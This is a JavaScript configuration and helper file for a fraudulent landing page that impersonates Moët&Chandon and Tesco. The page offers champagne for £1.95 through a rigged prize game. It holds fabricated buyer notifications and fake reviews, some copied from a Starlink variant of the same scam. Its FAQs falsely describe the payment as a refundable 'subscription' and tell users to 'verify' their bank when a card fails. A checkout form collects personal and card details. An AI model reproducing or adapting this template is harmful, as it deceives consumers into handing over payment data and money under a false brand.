const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;
const siteKey = "moet-gb";

(function (exp) {
  const countryCode = "gb";
  const lang = "en-GB";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "Congratulations!",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    timer: "Time is limited, hurry to place your order!",
    text: "To celebrate its 280th anniversary, the leading champagne brand <b>Moët&Chandon</b> has partnered with the <b>British</b> supermarket chain <b>Tesco</b> to launch a sale of 1,000 bottles of Brut Impérial champagne for just <b>£1.95</b>.",
  };

  const notifications = [
    {
      user: "Bea V***",
      location: "London, UK",
      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
      timeago: "15 seconds ago",
    },
    {
      user: "Tessa B***",
      location: "Manchester, UK",
      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
      timeago: "25 seconds ago",
    },
  ];

  const reviewsArr = [
    {
      name: "Josefien",
      time: "1 day ago",
      header: "This is unexpected!",
      product: "26468782",
      image: "./assets/proof1.jpg",
      review: "Just yesterday I left a request, but my sister has already received my Starlink. She took part a week earlier and I decided to wait until she was delivered to Starlink to understand the truth or not.",
    },
    {
      name: "Anton",
      time: "2 days ago",
      header: "Fantastic! I'm speechless.",
      product: "26468789",
      image: "./assets/proof2.jpg",
      review: "I took part in the sale and today received my Starlink terminal, the appearance is even better than in the photo.",
    },
    {
      name: "Jan",
      time: "2 days ago",
      header: "I love it.",
      product: "26468783",
      review: "Thanks to Starlink for this sale, I just won Starlink on the first attempt.They called me and agreed on the delivery date.",
    },
    {
      name: "Nico",
      time: "4 days ago",
      header: "Simply great",
      image: "./assets/proof3.jpg",
      review: "This is true, they just brought me Starlink, I still can’t believe that I received it in just 2 £.",
    },
    {
      name: "Jackson",
      time: "7 days ago",
      header: "Wow, I'm absolutely impressed with this product!",
      product: "26468784",
      image: "./assets/proof4.jpg",
      review: "Delivery lingered for two days, but I am still very pleased with the purchase!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "REVIEWS AND RATINGS",
    percent: "99%",
    rec: "Testimonials from customers who have received the product",
  };

  const questions = {
    _of: "Question {1} of {2}: ",
    arr: [
      {
        q: "Have you ever tried Moët&Chandon Brut Imperial?",
        a: ["Yes", "No"],
      },
      {
        q: "Where did you find this promotion?",
        a: ["On the official website", "Facebook ads", "Recommended by a friend"],
      },
      {
        q: "What purpose do you use Moët&Chandon Brut Imperial for?",
        a: ["As a gift", "For personal use"],
      },
    ],
  };

  const check = {
    title: "Your answers are being verified.",
    secondTitle: "Loading...",
    arr: [
      "You have answered question 3/3",
      "No previous surveys from your IP.",
      "Gifts are being loaded...",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Congratulations, you have successfully confirmed that you are a real person.",
        button: "OK",
        text: `
      <center>
      Today, on {date}, you have the chance to receive your Moët&Chandon Brut Imperial.
        <br><br>
        You just need to choose the correct gift.
        <br><br>
        You have 3 options, good luck!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
      <center>
      Sorry, but this gift is empty. You have 2 attempts left. Good luck!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: `Congratulations! You have won!`,
        button: "OK",
        text: `
      <center>
        <p style="color: #b51817">
        You have won Moët&Chandon Brut Imperial!
        </p>
        <br>
        1) Click "OK" below to proceed to the payment page for delivery.
         <br><br>
        2) Fill out the form and pay for your order to receive Moët&Chandon.
        <br><br>
        3) The package will be delivered within 5 to 7 days.
      </center>
    `,
      },
    },
  };

  const faqs = [
    {
      question: "How long do I have to wait for my prize?",
      answer: "It usually takes 5 to 7 working days.",
    },
    {
      question: "Are there any hidden costs?",
      answer: "Absolutely not. Once you have won your prize and entered your details, we take care of the rest. The delivery costs are on us!",
    },
    {
      question: "I'm a winner, why do I have to answer questions/choose a gift?",
      answer: "You are not a winner yet, but you are one of the 10 selected who can try to win our prize...",
    },
    {
      question: "How can I receive the prize if I win?",
      answer: "You must first enter your delivery address and contact details, and then our system will guide you further. You must then prove that you are not a robot, as the prize is only offered to real people.",
    },
    {
      question: "Why do I have to pay £1.95 for the prize?",
      answer: "£1.95 is not a prize - it is a subscription that proves you are a real person. All payments are refunded upon approval.",
    },
    {
      question: "I can't use my credit card, the transaction failed?",
      answer: "If you cannot use your credit card, your bank is blocking the transaction: you must verify your bank account.",
    },
  ];

  const cartSteps = {
    personal: {
      title: "Personal Information",
      fields: {
        name: {
          enabled: true,
          field: "First Name",
        },
        family: {
          enabled: true,
          field: "Last Name",
        },
        phone: {
          enabled: true,
          field: "Phone Number",
        },
        email: {
          enabled: true,
          field: "Email",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          enabled: true,
          field: "City",
        },
        address: {
          enabled: true,
          field: "Delivery Address",
        },
        zip: {
          enabled: true,
          field: "Postcode",
        },
      },
    },
    payment: {
      title: "Payment Methods",
      creditCard: "Online payment with credit card",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Summary",
      oldPrice: "",
      newPrice: "£1.95",
      size: "Size",
      subTotal: {
        title: "Order Value",
        amount: "£1.95",
      },
      delivery: {
        title: "Delivery",
        amount: "£0.00",
      },
      total: {
        title: "Total",
        amount: "£1.95",
      },
      checkoutButton: "Pay for your order",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Starlink Internet Terminal",
      miniImg: "./assets/prize.png",

      images: ["./assets/slide_1.jpg", "./assets/slide_2.jpg"],
    },
  ];

  const footer = {
    cr: "© 2024 Moët&Chandon. All rights reserved.",
  };

  exp.__config = {
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    faqs,
  };
})(window);

const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};

window.addEventListener("load", () => {


});


function setCookie(name, value, days = 2) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};



const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);

const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");
  // let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};

const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => {
  setCookie("__selected_size", val);
  // localStorage.setItem("__selected_size", val);
};

const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  // const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
// const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);
  // const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

function proceedWithoutCheckout() {
  window.location.href = "https://{trackingdomain}/click/";
}

const enableLoader = () => {
  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {

  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");

};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
